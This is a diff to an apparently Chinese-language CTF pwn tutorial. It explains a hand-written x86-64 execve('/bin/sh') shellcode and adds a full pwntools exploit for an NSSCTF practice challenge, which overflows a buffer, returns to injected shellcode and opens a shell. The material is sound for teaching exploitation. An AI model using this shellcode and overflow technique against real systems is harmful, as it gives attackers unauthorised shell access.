@@ -714,11 +714,37 @@ if __name__ == "__main__":
 
 ```
 
-#### Ret2shellcode
+#### shellcode && Ret2shellcode
 
 shellcode 是一段“机器码字节序列”（比如 x86-64 指令），它自己就能完成系统调用：`execve("/bin/sh",0,0)`，从而起 shell。
 
 简单说，`shellcode = asm(shellcraft.sh())` 的含义就是，生成一段打开 `/bin/sh` 的机器码。
+
+比如：
+
+```
+shellcode = ``` 
+mov rbx, 0x68732f6e69622f
+push rbx
+push rsp
+pop rdi
+xor esi, esi
+xor edx, edx
+push 0x3b
+pop rax
+syscall```
+
+```
+
+1. `mov rbx, 0x68732f6e69622f`：把字符串 `/bin/sh`（按小端序倒着）塞进寄存器 `rbx`。
+2. `push rbx`：把这 8 字节压栈。
+3. `push rsp; pop rdi`：让 `rdi` 指向栈顶，也就是指向 `/bin/sh` 那块内存。
+4. `xor esi, esi`，`rsi = 0`：argv 设为 NULL。
+5. `xor edx, edx`，`rdx = 0`：envp 设为 NULL。
+6. `push 0x3b; pop rax`，`rax = 0x3b`：execve syscall 号
+7. `syscall`：发起系统调用：execve("/bin/sh", 0, 0)
+
+也可以用现成生成器直接给一段通用 shellcode : `shellcode = asm(shellcraft.sh())`
 
 先判断“这题能不能 ret2shellcode”，通常安全保护如下：
 
@@ -831,6 +857,59 @@ if __name__ == "__main__":
 但是栈的地址是 ASLR 随机化的，所以找栈的位置为什么不直接 ret2libc 呢。
 
 不过大概可以在本地关掉 ASLR 实验一下。
+
+[类似题目 NSS CTF：Shellcode](https://www.nssctf.cn/problem/3659)
+
+这道题目安全防护：
+
+<img width="404" height="148" alt="8c7f739439dba13129afbf773b601895" src="https://github.com/user-attachments/assets/597cc5b7-ea99-4d4e-a20c-53d31e2fee5c" />
+
+虽然是 NX enabled，但是查一下：
+
+<img width="996" height="412" alt="image" src="https://github.com/user-attachments/assets/46f8685d-995d-4138-aa59-6004ae6e8912" />
+
+<img width="1274" height="349" alt="image" src="https://github.com/user-attachments/assets/2e68c4c7-8e7e-463e-a2ed-6e6d3b198425" />
+
+<img width="1280" height="346" alt="image" src="https://github.com/user-attachments/assets/25112a64-e7a7-4c19-855f-d90607b6de0c" />
+
+发现确实是不可执行栈，`&name` 也在不可执行段，但是有 `mprotect((void *)((unsigned __int64)&stdout & 0xFFFFFFFFFFFFF000LL), 0x1000u, 7);`，相当于开了可执行。
+
+另外注意，`read(0, &name, 0x25u);` 意味着发的 shellcode 要在 37 字节内，但是 shellcraft 生成的，输出一下长度就发现是 48，超了，所以自己写一个shellcode。
+
+```
+# written by Sonnety
+from pwn import *
+context.arch = "amd64"
+host = "node4.anna.nssctf.cn"
+port = 26418
+offset = 18
+name_adr = 0x6010A0	
+
+shellcode='''
+mov rbx, 0x68732f6e69622f  
+push rbx
+push rsp 
+pop rdi
+xor esi, esi               
+xor edx, edx            
+push 0x3b
+pop rax
+syscall
+'''
+
+def main():
+    io = remote(host,port)
+    io.recvuntil(b"Please.\n")
+    io.sendline(asm(shellcode))
+    io.recvuntil(b"Nice to meet you.\n")
+    io.recvuntil(b"Let's start!\n")
+    payload = b"A"*offset + p64(name_adr)
+    io.sendline(payload)
+    io.interactive()
+
+if  __name__ == "__main__":
+    main()
+```
 
 ##### 例题 3：mrctf2020_shellcode
 
